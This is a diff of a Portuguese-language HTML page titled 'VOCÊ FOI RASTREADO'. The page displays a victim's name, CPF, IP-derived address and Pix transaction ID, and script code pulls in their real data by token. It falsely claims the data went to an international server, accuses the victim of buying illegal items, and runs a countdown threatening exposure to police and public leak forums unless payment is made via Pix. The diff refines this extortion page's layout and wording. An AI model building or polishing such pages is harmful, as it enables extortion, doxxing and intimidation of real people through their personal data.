@@ -18,14 +18,13 @@
       font-family: 'Courier New', monospace;
       font-size: 16px;
       line-height: 1.4;
-      overflow: hidden;
-      position: fixed;
-      width: 100vw;
-      height: 100vh;
+      min-height: 100vh;
+      overflow-x: hidden;
+      overflow-y: auto;
       display: flex;
       justify-content: center;
-      align-items: center;
-      text-align: center;
+      align-items: flex-start;
+      padding: 20px 0;
       user-select: none;
       -webkit-user-select: none;
       -moz-user-select: none;
@@ -35,10 +34,14 @@
       -webkit-tap-highlight-color: transparent;
     }
     
-    .container {
-      width: 90%;
+    .central-rectangle {
+      width: 80%;
       max-width: 800px;
-      padding: 20px;
+      border: 1px solid #cccccc;
+      padding: 16px;
+      margin: auto;
+      background: transparent;
+      text-align: center;
     }
     
     .main-title {
@@ -46,7 +49,7 @@
       font-weight: bold;
       color: #ff0000;
       margin-bottom: 30px;
-      text-shadow: 0 0 10px #ff0000;
+      text-align: center;
       animation: slowBlink 2s infinite;
     }
     
@@ -55,58 +58,58 @@
       51%, 100% { opacity: 0.3; }
     }
     
+    .intro-text {
+      color: #ffffff;
+      margin: 25px 0;
+      text-align: left;
+      font-size: 16px;
+      line-height: 1.6;
+    }
+    
     .data-section {
       margin: 25px 0;
       text-align: left;
+      color: #ffffff;
     }
     
     .data-line {
       margin: 10px 0;
-      font-size: 18px;
-    }
-    
-    .data-value {
-      background: #ffffff;
-      color: #000000;
-      padding: 2px 8px;
-      display: inline;
-      font-weight: bold;
+      font-size: 16px;
     }
     
     .server-msg {
-      font-size: 20px;
+      font-size: 18px;
       font-weight: bold;
       margin: 25px 0;
       color: #ff0000;
-      text-shadow: 0 0 15px #ff0000;
+      text-align: center;
     }
     
-    .purple-text {
-      color: #9932cc;
-      font-size: 18px;
+    .explanation-text {
+      color: #ffffff;
       margin: 20px 0;
+      text-align: center;
+      font-size: 16px;
     }
     
     .countdown-label {
-      font-size: 24px;
+      font-size: 20px;
       font-weight: bold;
       margin: 25px 0 10px 0;
       color: #ffffff;
+      text-align: center;
     }
     
     .countdown {
-      font-size: 32px;
+      font-size: 28px;
       font-weight: bold;
       color: #ff0000;
       margin: 10px 0 25px 0;
-      text-shadow: 0 0 20px #ff0000;
-      border: 2px solid #ff0000;
-      padding: 15px;
-      display: inline-block;
+      text-align: center;
     }
     
     .warning-text {
-      font-size: 18px;
+      font-size: 16px;
       margin: 20px 0;
       color: #ffffff;
       text-align: left;
@@ -116,6 +119,7 @@
       text-align: left;
       margin: 15px 0;
       padding-left: 20px;
+      color: #ffffff;
     }
     
     .warning-list li {
@@ -124,11 +128,11 @@
     }
     
     .pix-info {
-      font-size: 22px;
+      font-size: 24px;
       font-weight: bold;
       margin: 30px 0;
       color: #ffff00;
-      text-shadow: 0 0 10px #ffff00;
+      text-align: center;
     }
     
     /* Screen flash effect */
@@ -137,24 +141,25 @@
         border: none;
       }
       98%, 100% { 
-        border: 3px solid #ff0000;
-        box-shadow: 0 0 20px #ff0000;
+        border: 2px solid #ff0000;
+        box-shadow: 0 0 10px #ff0000;
       }
     }
     
     body {
-      animation: screenFlash 3s infinite;
+      animation: screenFlash 4s infinite;
     }
     
     /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
         font-size: 14px;
+        padding: 10px 0;
       }
       
-      .container {
-        width: 95%;
-        padding: 10px;
+      .central-rectangle {
+        width: 90%;
+        padding: 12px;
       }
       
       .main-title {
@@ -162,12 +167,11 @@
       }
       
       .countdown {
-        font-size: 24px;
-        padding: 10px;
+        font-size: 20px;
       }
       
-      .data-line {
-        font-size: 16px;
+      .pix-info {
+        font-size: 18px;
       }
     }
     
@@ -184,32 +188,30 @@
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="central-rectangle">
     <div class="main-title">
       VOCÊ FOI RASTREADO
     </div>
     
+    <div class="intro-text">
+      Olá, <span id="nome-cliente">[NOME_DO_CLIENTE]</span><br>
+      Seu CPF <span id="cpf-cliente">[CPF_DO_CLIENTE]</span> foi vinculado à tentativa de compra de itens ilegais.
+    </div>
+    
     <div class="data-section">
-      <div class="data-line">
-        Nome completo: <span class="data-value" id="nome-cliente">[nome_do_cliente]</span>
-      </div>
-      <div class="data-line">
-        CPF: <span class="data-value" id="cpf-cliente">[cpf_do_cliente]</span>
-      </div>
-      <div class="data-line">
-        Endereço (via IP): <span class="data-value" id="ip-cliente">[ip_do_cliente]</span>
-      </div>
-      <div class="data-line">
-        end_to_end_id: <span class="data-value" id="end-to-end-cliente">[id_pix_do_cliente]</span>
-      </div>
+      <div style="margin-bottom: 15px; font-weight: bold;">Dados coletados:</div>
+      <div class="data-line">- Nome completo: <span id="nome-completo">[NOME_DO_CLIENTE]</span></div>
+      <div class="data-line">- CPF: <span id="cpf-completo">[CPF_DO_CLIENTE]</span></div>
+      <div class="data-line">- Endereço (via IP): <span id="ip-cliente">[IP_DO_CLIENTE]</span></div>
+      <div class="data-line">- end_to_end_id: <span id="end-to-end-cliente">[ID_PIX_CLIENTE]</span></div>
     </div>
     
     <div class="server-msg">
       TODOS OS DADOS FORAM ENVIADOS PARA UM SERVIDOR INTERNACIONAL
     </div>
     
-    <div class="purple-text">
-      Você achou que era só um bot de vendas. Agora tá no radar. E a regra é simples:
+    <div class="explanation-text">
+      Você achou que era só um bot de vendas. Agora está no radar. E a regra é simples:
     </div>
     
     <div class="countdown-label">
@@ -225,7 +227,7 @@
     </div>
     
     <ul class="warning-list">
-      <li>Enviados às autoridades</li>
+      <li>Enviados à polícia</li>
       <li>Postados em fóruns públicos de vazamento</li>
       <li>Associados a crimes cibernéticos</li>
     </ul>
@@ -242,10 +244,10 @@
     
     // Dados padrão
     let dadosCliente = {
-      nome: '[nome_do_cliente]',
-      cpf: '[cpf_do_cliente]',
-      ip: '[ip_do_cliente]',
-      end_to_end_id: '[id_pix_do_cliente]'
+      nome: '[NOME_DO_CLIENTE]',
+      cpf: '[CPF_DO_CLIENTE]',
+      ip: '[IP_DO_CLIENTE]',
+      end_to_end_id: '[ID_PIX_CLIENTE]'
     };
     
     // Tentar buscar dados reais se token existir
@@ -257,10 +259,12 @@
             if (data.nome && data.nome !== 'N/A') {
               dadosCliente.nome = data.nome;
               document.getElementById('nome-cliente').textContent = dadosCliente.nome;
+              document.getElementById('nome-completo').textContent = dadosCliente.nome;
             }
             if (data.cpf && data.cpf !== 'N/A') {
               dadosCliente.cpf = data.cpf;
               document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
+              document.getElementById('cpf-completo').textContent = dadosCliente.cpf;
             }
             if (data.ip && data.ip !== 'N/A') {
               dadosCliente.ip = data.ip;
